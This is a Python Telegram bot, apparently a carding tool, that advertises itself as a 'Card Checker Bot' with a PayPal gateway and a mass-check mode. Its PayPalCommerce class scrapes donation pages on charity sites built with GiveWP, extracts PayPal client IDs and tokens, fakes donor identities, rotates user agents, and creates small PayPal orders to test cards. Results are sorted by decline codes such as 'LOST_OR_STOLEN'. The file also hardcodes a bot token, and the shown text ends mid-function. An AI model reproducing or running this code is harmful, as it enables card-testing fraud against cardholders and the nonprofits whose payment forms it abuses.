import telebot
import time
import threading
from telebot import types
import requests, random, json, string, re, base64
from telebot.types import LabeledPrice
from datetime import datetime, timedelta
import os
import html
import gc
import sys
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === استيراد UserAgent مع fallback ===
try:
    from fake_useragent import UserAgent
    uu = UserAgent()
    HAS_FAKE_UA = True
except:
    HAS_FAKE_UA = False
    class SimpleUA:
        def __init__(self):
            self.agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            ]
        
        def random(self):
            return random.choice(self.agents)

# === بيانات البوت ===
token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
myid = ['6843321125']
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}
processing_status = {}

# تتبع الأخطاء
error_counter = {
    '502': 0,
    '429': 0,
    '500': 0,
    'timeout': 0,
    'connection': 0
}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')

def track_error(error_type):
    """تتبع الأخطاء المتتالية"""
    if error_type in error_counter:
        error_counter[error_type] += 1
        if error_counter[error_type] > 10:
            print(f"⚠️ Too many {error_type} errors! Waiting 60s...")
            time.sleep(60)
            error_counter[error_type] = 0
    else:
        for key in error_counter:
            error_counter[key] = 0

def reset_error_counter():
    """إعادة تعيين عداد الأخطاء"""
    for key in error_counter:
        error_counter[key] = 0

def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=10):
    """نسخة محسنة تتعامل مع جميع أنواع الأخطاء"""
    for i in range(retries):
        try:
            result = bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
            reset_error_counter()
            return result
        except Exception as e:
            error_str = str(e)
            
            if "429" in error_str:
                track_error('429')
                try:
                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
                except:
                    wait_time = 30
                print(f"⏳ FloodWait (edit): {wait_time}s")
                time.sleep(min(wait_time + 5, 65))
                
            elif "502" in error_str or "Bad Gateway" in error_str:
                track_error('502')
                wait_time = 5 * (i + 1)
                print(f"⚠️ 502 Bad Gateway (edit) - attempt {i+1}/{retries}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            elif "500" in error_str or "Internal Server Error" in error_str:
                track_error('500')
                wait_time = 3 * (i + 1)
                print(f"⚠️ 500 Error (edit) - attempt {i+1}/{retries}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            elif "Timed out" in error_str or "timeout" in error_str.lower():
                track_error('timeout')
                wait_time = 2 * (i + 1)
                print(f"⚠️ Timeout (edit) - attempt {i+1}/{retries}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            elif "Connection" in error_str or "ConnectionError" in error_str:
                track_error('connection')
                wait_time = 3 * (i + 1)
                print(f"⚠️ Connection Error (edit) - attempt {i+1}/{retries}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            else:
                print(f"❌ Error (edit): {error_str[:100]}")
                break
    return None

def safe_send_message(chat_id, text, parse_mode="HTML", retries=10, reply_markup=None):
    """نسخة محسنة تتعامل مع جميع أنواع الأخطاء"""
    for i in range(retries):
        try:
            result = bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
            reset_error_counter()
            return result
        except Exception as e:
            error_str = str(e)
            
            if "429" in error_str:
                track_error('429')
                try:
                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
                except:
                    wait_time = 30
                print(f"⏳ FloodWait (msg): {wait_time}s")
                time.sleep(min(wait_time + 5, 65))
                
            elif "502" in error_str or "Bad Gateway" in error_str:
                track_error('502')
                wait_time = 5 * (i + 1)
                print(f"⚠️ 502 Bad Gateway (msg) - attempt {i+1}/{retries}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            elif "500" in error_str or "Internal Server Error" in error_str:
                track_error('500')
                wait_time = 3 * (i + 1)
                print(f"⚠️ 500 Error (msg) - attempt {i+1}/{retries}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            elif "Timed out" in error_str or "timeout" in error_str.lower():
                track_error('timeout')
                wait_time = 2 * (i + 1)
                print(f"⚠️ Timeout (msg) - attempt {i+1}/{retries}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            elif "Connection" in error_str or "ConnectionError" in error_str:
                track_error('connection')
                wait_time = 3 * (i + 1)
                print(f"⚠️ Connection Error (msg) - attempt {i+1}/{retries}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            else:
                print(f"❌ Error (msg): {error_str[:100]}")
                break
    return None

def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=10):
    """نسخة محسنة تتعامل مع جميع أنواع الأخطاء"""
    for i in range(retries):
        try:
            with open(file_path, 'rb') as f:
                result = bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
            reset_error_counter()
            return result
        except Exception as e:
            error_str = str(e)
            
            if "429" in error_str:
                track_error('429')
                try:
                    wait_time = int(error_str.split("retry after ")[1].split(")")[0]) if "retry after" in error_str else 30
                except:
                    wait_time = 30
                print(f"⏳ FloodWait (send): {wait_time}s")
                time.sleep(min(wait_time + 5, 65))
                
            elif "502" in error_str or "Bad Gateway" in error_str:
                track_error('502')
                wait_time = 5 * (i + 1)
                print(f"⚠️ 502 Bad Gateway (send) - attempt {i+1}/{retries}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            elif "500" in error_str or "Internal Server Error" in error_str:
                track_error('500')
                wait_time = 3 * (i + 1)
                print(f"⚠️ 500 Error (send) - attempt {i+1}/{retries}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            elif "Timed out" in error_str or "timeout" in error_str.lower():
                track_error('timeout')
                wait_time = 2 * (i + 1)
                print(f"⚠️ Timeout (send) - attempt {i+1}/{retries}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            elif "Connection" in error_str or "ConnectionError" in error_str:
                track_error('connection')
                wait_time = 3 * (i + 1)
                print(f"⚠️ Connection Error (send) - attempt {i+1}/{retries}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            else:
                print(f"❌ Error (send): {error_str[:100]}")
                break
    return None

def safe_get_file(file_id, retries=10):
    """تحميل ملف مع معالجة الأخطاء"""
    for i in range(retries):
        try:
            result = bot.get_file(file_id)
            reset_error_counter()
            return result
        except Exception as e:
            error_str = str(e)
            
            if "502" in error_str or "Bad Gateway" in error_str:
                track_error('502')
                wait_time = 5 * (i + 1)
                print(f"⚠️ 502 in get_file - attempt {i+1}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            elif "429" in error_str:
                track_error('429')
                wait_time = 30
                try:
                    wait_time = int(error_str.split("retry after ")[1].split(")")[0])
                except:
                    pass
                print(f"⏳ FloodWait in get_file: {wait_time}s")
                time.sleep(min(wait_time, 60))
                
            elif "500" in error_str:
                track_error('500')
                wait_time = 3 * (i + 1)
                print(f"⚠️ 500 in get_file - attempt {i+1}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            else:
                print(f"❌ Error in get_file: {error_str[:100]}")
                break
    return None

def safe_download_file(file_path, retries=10):
    """تحميل ملف مع معالجة الأخطاء"""
    for i in range(retries):
        try:
            result = bot.download_file(file_path)
            reset_error_counter()
            return result
        except Exception as e:
            error_str = str(e)
            
            if "502" in error_str or "Bad Gateway" in error_str:
                track_error('502')
                wait_time = 5 * (i + 1)
                print(f"⚠️ 502 in download - attempt {i+1}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            elif "429" in error_str:
                track_error('429')
                wait_time = 30
                try:
                    wait_time = int(error_str.split("retry after ")[1].split(")")[0])
                except:
                    pass
                print(f"⏳ FloodWait in download: {wait_time}s")
                time.sleep(min(wait_time, 60))
                
            elif "500" in error_str:
                track_error('500')
                wait_time = 3 * (i + 1)
                print(f"⚠️ 500 in download - attempt {i+1}, waiting {wait_time}s...")
                time.sleep(wait_time)
                
            else:
                print(f"❌ Error in download: {error_str[:100]}")
                break
    return None

PAYPAL_RESPONSES = [
    'Payer cannot pay', 'INSUFFICIENT_FUNDS', 'ORDER_NOT_APPROVED',
    'TRANSACTION_REFUSED', 'PAYER_ACTION_REQUIRED', 'INSTRUMENT_DECLINED',
    'CARD_DECLINED', 'PAYMENT_DENIED', 'PAYER_CANNOT_PAY',
    'EXPIRED_CARD', 'INVALID_PAYMENT_METHOD', 'DO_NOT_HONOR',
    'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'CVV2_FAILURE',
    'SUSPECTED_FRAUD', 'INVALID_ACCOUNT', 'REATTEMPT_NOT_PERMITTED',
    'ACCOUNT_BLOCKED_BY_ISSUER', 'PICKUP_CARD_SPECIAL_CONDITIONS',
    'GENERIC_DECLINE', 'COMPLIANCE_VIOLATION', 'TRANSACTION_NOT_PERMITTED',
    'INVALID_TRANSACTION', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'SECURITY_VIOLATION', 'DECLINED_DUE_TO_UPDATED_ACCOUNT',
    'INVALID_OR_RESTRICTED_CARD', 'EXPIRED_CREDIT_CARD', 'CRYPTOGRAPHIC_FAILURE',
    'TRANSACTION_CANNOT_BE_COMPLETED', 'DECLINED_PLEASE_RETRY',
    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
    'DECLINED', 'CHARGE', 'UNPROCESSABLE_ENTITY', 'VALIDATION_ERROR',
    'INVALID_REQUEST', 'AUTHENTICATION_FAILURE', 'NOT_AUTHORIZED',
    'NOT_ENABLED_FOR_CARD_PROCESSING', 'CARD_TYPE_NOT_SUPPORTED',
    'MERCHANT_NOT_ENABLED', 'PAYEE_NOT_ENABLED_FOR_CARD_PROCESSING',
    'INVALID_CURRENCY', 'CURRENCY_NOT_SUPPORTED', 'AMOUNT_MISMATCH',
    'ITEM_TOTAL_MISMATCH', 'TAX_TOTAL_MISMATCH', 'SHIPPING_TOTAL_MISMATCH',
    'HANDLING_TOTAL_MISMATCH', 'INSURANCE_TOTAL_MISMATCH', 'SHIPPING_DISCOUNT_MISMATCH',
    'INVALID_PAYER_ID', 'INVALID_PAYEE_ID', 'INVALID_RESOURCE_ID',
    'INVALID_PARAMETER', 'INVALID_PARAMETER_SYNTAX', 'INVALID_STRING_LENGTH',
    'INVALID_STRING_FORMAT', 'MISSING_REQUIRED_PARAMETER', 'DUPLICATE_REQUEST_ID',
    'DUPLICATE_INVOICE_ID', 'MAX_NUMBER_OF_PAYMENT_ATTEMPTS_EXCEEDED',
    'PAYEE_ACCOUNT_RESTRICTED', 'PAYEE_ACCOUNT_INVALID', 'PAYEE_ACCOUNT_LOCKED_OR_CLOSED',
    'PAYEE_BLOCKED_TRANSACTION', 'PAYER_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
    'PAYER_ACCOUNT_INVALID', 'UNSUPPORTED_INTENT', 'UNSUPPORTED_PAYMENT_INSTRUMENT',
    'UNSUPPORTED_SHIPPING_TYPE', 'SHIPPING_ADDRESS_INVALID', 'SHIPPING_OPTION_NOT_SUPPORTED',
    'MULTIPLE_SHIPPING_ADDRESS_NOT_SUPPORTED', 'MULTIPLE_SHIPPING_OPTION_SELECTED',
    'INVALID_PICKUP_ADDRESS', 'PICKUP_ADDRESS_INVALID', 'INVALID_SHIPPING_ADDRESS',
    'AUTHORIZATION_VOIDED', 'AUTHORIZATION_EXPIRED', 'AUTHORIZATION_DENIED',
    'AUTHORIZATION_CAPTURED', 'CAPTURE_FULLY_REFUNDED', 'CAPTURE_PARTIALLY_REFUNDED',
    'REFUND_NOT_PERMITTED', 'REFUND_DENIED', 'REFUND_FAILED',
    'TRANSACTION_ALREADY_REFUNDED', 'TRANSACTION_LIMIT_EXCEEDED',
    'BILLING_AGREEMENT_NOT_FOUND', 'BILLING_AGREEMENT_CANCELLED',
    'BILLING_AGREEMENT_EXPIRED', 'BILLING_AGREEMENT_FAILED',
    'INTERNAL_SERVER_ERROR', 'SERVICE_UNAVAILABLE', 'RESOURCE_NOT_FOUND',
    'METHOD_NOT_ALLOWED', 'NOT_ACCEPTABLE', 'UNSUPPORTED_MEDIA_TYPE',
    'RATE_LIMIT_REACHED', 'INSUFFICIENT_PERMISSIONS', 'INVALID_ACCESS_TOKEN',
    'EXPIRED_ACCESS_TOKEN', 'MALFORMED_REQUEST', 'UNKNOWN_ERROR',
]

DEAD_RESPONSES = [
    'invalid_client', 'Client Authentication failed', 'invalid_grant',
    'unsupported_grant_type', 'invalid_scope', 'Create Order Failed',
    'Invalid card format', 'No form fields', 'No au', 'No PayPal data',
    'Connection failed', 'Decode error', 'Invalid URL', 'Error:',
    'name', 'UserAgent', 'ImportError', 'Expecting value',
]

@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, 'The admin has blocked you due to your negative behavior.')
        return 
    
    user_id = message.from_user.id
    userr = message.from_user.first_name
    username = message.from_user.username or "No Username"

    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟
[⚡] 𝐍𝐚𝐦𝐞: {userr}
[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}
[⚡] 𝐈𝐃: <code>{user_id}</code>
- - - - - - - - - - - - - - - - - - - - - -
[⚡] PayPal Gateway >> /paypal 
[⚡] Mass Extract >> /mass
[⚡] Send Feedback >> Button Below
- - - - - - - - - - - - - - - - - - - - - -
[⚡] 𝐁𝐨𝐭 𝐁𝐲: @FAWZY30
[⚡] 𝐃𝐞𝐯 𝐁𝐲: Wafa.'''
    
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)
    
    safe_send_message(message.chat.id, IU, reply_markup=FRA)

@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    Atty = types.InlineKeyboardMarkup(row_width=1)
    back = types.InlineKeyboardButton("Back", callback_data="start")
    Atty.add(back)
    YTT = f'''Welcome {userr} Send your message and the admin will respond.'''
    try:
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=YTT, parse_mode='HTML', reply_markup=Atty)
    except Exception as e:
        print(f"Feedback error: {e}")
    waiting_users[user_id] = True

@bot.message_handler(func=lambda m: m.from_user.id in waiting_users)
def get_user_msg(message):
    user_id = message.from_user.id
    name = message.from_user.first_name
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
    safe_send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {message.text}", reply_markup=kb)
    kb2 = types.InlineKeyboardMarkup()
    kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
    safe_send_message(user_id, "Your message has been sent.", reply_markup=kb2)
    waiting_users.pop(user_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    user_id = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = user_id
    safe_send_message(call.from_user.id, "Write your reply now:")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    user_id = reply_mode[message.from_user.id]
    safe_send_message(user_id, f"Admin response:\n\n{message.text}")
    safe_send_message(OWNER_ID, "Reply sent.")
    reply_mode.pop(message.from_user.id)

@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    user_id = call.from_user.id
    userr = call.from_user.first_name
    username = call.from_user.username or "No Username"
    IU = f'''[⚡] 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐞𝐫 𝐁𝐨𝐭 🌟\n[⚡] 𝐍𝐚𝐦𝐞: {userr}\n[⚡] 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n[⚡] 𝐈𝐃: <code>{user_id}</code>'''
    FRA = types.InlineKeyboardMarkup(row_width=2)
    Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
    FRA.add(Yes22)
    try:
        bot.edit_message_text(IU, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=FRA)
    except Exception as e:
        print(f"Back error: {e}")

# ═══════════════════════ PayPalCommerce Class (FINAL) ═══════════════════════

class PayPalCommerce:
    def __init__(self, target_url=None):
        self.first_name = [
            "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles",
            "Roger", "Noah", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Paul", "Andrew", "Joshua",
            "Kevin", "Brian", "Edward", "George", "Ronald", "Teresa", "Mary", "Patricia", "Jennifer", "Linda",
            "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen", "Nancy", "Lisa", "Betty", "Margaret",
            "Sandra", "Ashley", "Kimberly", "Emily", "Donna", "Michelle", "Carol", "Amanda", "Dorothy", "Melissa",
            "Deborah", "Stephanie", "Rebecca", "Sharon", "Laura", "Cynthia", "Kathleen", "Amy", "Angela", "Shirley"
        ]
        self.last_name = [
            "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez",
            "Morgan", "Wilson", "Anderson", "Taylor", "Thomas", "Moore", "Jackson", "Martin", "Lee", "Thompson",
            "White", "Harris", "Clark", "Lewis", "Walker", "Rath", "Hall", "Allen", "Young", "Hernandez",
            "King", "Wright", "Lopez", "Hill", "Scott", "Green", "Adams", "Baker", "Gonzalez", "Nelson",
            "Carter", "Mitchell", "Perez", "Roberts", "Turner", "Phillips", "Campbell", "Parker", "Evans", "Edwards"
        ]
        self.donation = "1.00"
        self.minimum_amount = "1.00"
        self.currency = "USD"
        self.r = requests.Session()
        self.r.verify = False
        if HAS_FAKE_UA:
            self.uu = UserAgent()
        else:
            self.uu = SimpleUA()
        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.cookies = {}
        self.target_url = target_url if target_url else 'https://www.sandiegoyokohamasistercity.org/donations/donation-form/'
        self.url = urlparse(self.target_url).netloc
        self.inurl = urlparse(self.target_url).path
        if urlparse(self.target_url).query:
            self.inurl += f"?{urlparse(self.target_url).query}"
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        self.is_valid_gateway = True

        self.paypal_responses = PAYPAL_RESPONSES.copy()

        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0'
        ]
        self.ua_index = 0

        self._init_and_extract()
        self._get_access_token()
        self._get_client_token()

    def get_next_ua(self):
        try:
            if HAS_FAKE_UA:
                return self.uu.random
            else:
                ua = self.user_agents[self.ua_index % len(self.user_agents)]
                self.ua_index += 1
                return ua
        except:
            ua = self.user_agents[self.ua_index % len(self.user_agents)]
            self.ua_index += 1
            return ua

    def get_address_data(self):
        return {
            'give-address1': '123 Main Street', 'give-address2': 'Apt 4B',
            'give_Address2': 'Apt 4B', 'give-address_2': 'Apt 4B',
            'give_address2': 'Apt 4B', 'give_address_2': 'Apt 4B',
            'address_2': 'Apt 4B', 'address2': 'Apt 4B',
            'give-city': 'New York City', 'give-state': 'NY',
            'give-zip': '10001', 'give-country': 'US', 'give-phone': '2125551234',
            'address1': '123 Main Street', 'city': 'New York City',
            'state': 'NY', 'zip': '10001', 'country': 'US', 'phone': '2125551234',
            'billing_address_2': 'Apt 4B', 'shipping_address_2': 'Apt 4B',
        }

    def get_terms_data(self):
        return {
            'give_agree_to_terms': '1', 'give_tos_agree': '1',
            'give_terms_agreement': '1', 'give_terms': '1',
            'agree_to_terms': '1', 'tos_agree': '1',
        }

    def get_base_form_data(self):
        form_data = self.form_data.copy()
        first_name = random.choice(self.first_name)
        last_name = random.choice(self.last_name)
        form_data.update({
            'give-amount': self.minimum_amount, 'give-currency': self.currency,
            'currency': self.currency, 'payment-mode': 'paypal-commerce',
            'give_first': first_name, 'give_last': last_name,
            'first_name': first_name, 'last_name': last_name,
            'give_email': self.email, 'email': self.email,
            'give-gateway': 'paypal-commerce', 'give_company': '',
            'give_comment': '', 'give_anonymous': '0',
        })
        form_data.update(self.get_address_data())
        form_data.update(self.get_terms_data())
        return form_data

    def _extract_minimum_amount(self, html):
        try:
            patterns = [
                r'minimum donation amount of \$([\d.]+)',
                r'minimum donation amount of &euro;([\d.]+)',
                r'minimum donation amount of €([\d.]+)',
                r'minimum donation amount of £([\d.]+)',
                r'minimum donation amount[^\d]*([\d.]+)',
                r'data-min-amount=["\']([\d.]+)["\']',
                r'data-minimum-amount=["\']([\d.]+)["\']',
                r'min-amount=["\']([\d.]+)["\']',
                r'minimum_amount=["\']([\d.]+)["\']',
                r'min_amount=["\']([\d.]+)["\']',
                r'This form has a minimum donation amount of \$([\d.]+)',
                r'This form has a minimum donation amount of &euro;([\d.]+)',
            ]
            for pattern in patterns:
                match = re.search(pattern, html, re.IGNORECASE)
                if match:
                    amount = match.group(1)
                    try:
                        float(amount)
                        self.minimum_amount = amount
                        return
                    except:
                        continue
            min_inputs = re.findall(r'<input[^>]*min=["\']([\d.]+)["\'][^>]*>', html, re.IGNORECASE)
            if min_inputs:
                valid_amounts = [x for x in min_inputs if x.replace('.', '').isdigit()]
                if valid_amounts:
                    self.minimum_amount = max(valid_amounts, key=float)
                    return
            self.minimum_amount = "1.00"
        except:
            self.minimum_amount = "1.00"

    def _is_not_paypal_page(self, html):
        if not html:
            return True
        indicators = ['paypal', 'client-id', 'client_id', 'admin-ajax', 'give-form', 'donation-form', 'give_paypal', 'paypal_commerce', 'givewp']
        return not any(ind in html.lower() for ind in indicators)

    def _init_and_extract(self):
        try:
            headers = {
                'user-agent': self.get_next_ua(),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9'
            }
            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=10)
            self.cookies = dict(response.cookies)
            html = response.text
            if self._is_not_paypal_page(html):
                self.is_valid_gateway = False
                return
            self._extract_client_id(html)
            self._extract_form_data(html)
            self._extract_ajax_url(html)
            self._extract_minimum_amount(html)
        except:
            self.is_valid_gateway = False

    def _extract_client_id(self, html):
        patterns = [
            r'client-id="([^"]+)"', r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
            r'data-client-id="([^"]+)"', r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)', r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                self.client_id = match.group(1)
                return
        script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
        for script in script_matches:
            for pattern in patterns:
                match = re.search(pattern, script, re.IGNORECASE)
                if match:
                    self.client_id = match.group(1)
                    return
        long_strings = re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html)
        for string in long_strings:
            if string.startswith(('A', 'B', 'E')):
                self.client_id = string
                return

    def _extract_form_data(self, html):
        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
        for name, value in inputs:
            self.form_data[name] = value
        data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
        for attr_name, attr_value in data_attrs:
            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash']):
                self.form_data[attr_name] = attr_value

    def _extract_ajax_url(self, html):
        if 'admin-ajax.php' in html:
            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
        elif 'wc-ajax' in html:
            self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'

    def _get_access_token(self):
        if not self.client_id:
            return None
        try:
            headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded'}
            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''), timeout=10)
            if response.status_code == 200:
                self.access_token = response.json().get('access_token')
                return self.access_token
        except:
            pass
        return None

    def _get_client_token(self):
        if not self.ajax_url:
            return None
        try:
            actions = ['give_paypal_commerce_get_client_token', 'get_client_token', 'paypal_get_client_token']
            for action in actions:
                data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
                headers = {'user-agent': self.get_next_ua(), 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=10)
                if response.status_code == 200 and response.text:
                    try:
                        json_data = response.json()
                        if 'data' in json_data:
                            if isinstance(json_data['data'], dict):
                                self.client_token = json_data['data'].get('client_token') or json_data['data'].get('token')
                            elif isinstance(json_data['data'], str):
                                self.client_token = json_data['data']
                            if self.client_token:
                                return self.client_token
                    except:
                        pass
            return None
        except:
            return None

    def _create_order(self):
        if not self.is_valid_gateway:
            return None
        if self.ajax_url:
            order_id = self._create_order_givewp()
            if order_id:
                return order_id
        if self.access_token:
            order_id = self._create_order_direct()
            if order_id:
                return order_id
        if self.client_token:
            order_id = self._create_order_with_client_token()
            if order_id:
                return order_id
        return None

    def _create_order_givewp(self):
        if not self.ajax_url:
            return None
        amounts = []
        if self.minimum_amount != "1.00":
            amounts.append(self.minimum_amount)
        amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
        headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
        for amount in amounts:
            form_data = self.get_base_form_data()
            form_data['give-amount'] = amount
            form_data['amount'] = amount
            for action in actions:
                params = {'action': action}
                try:
                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=10)
                    if response.status_code == 200 and response.text:
                        try:
                            json_data = response.json()
                            if 'data' in json_data:
                                if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
                                    return json_data['data']['id']
                                elif isinstance(json_data['data'], str):
                                    return json_data['data']
                            if 'id' in json_data:
                                return json_data['id']
                            if 'order_id' in json_data:
                                return json_data['order_id']
                            if 'orderID' in json_data:
                                return json_data['orderID']
                        except:
                            pass
                except:
                    continue
        return None

    def _create_order_direct(self):
        if not self.access_token:
            return None
        try:
            headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}], 'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}}
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=10)
            if response.status_code in [200, 201]:
                response_data = response.json()
                if 'id' in response_data:
                    return response_data['id']
            return None
        except:
            return None

    def _create_order_with_client_token(self):
        if not self.client_token:
            return None
        try:
            headers = {'authorization': f'Bearer {self.client_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}]}
            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=10)
            if response.status_code in [200, 201]:
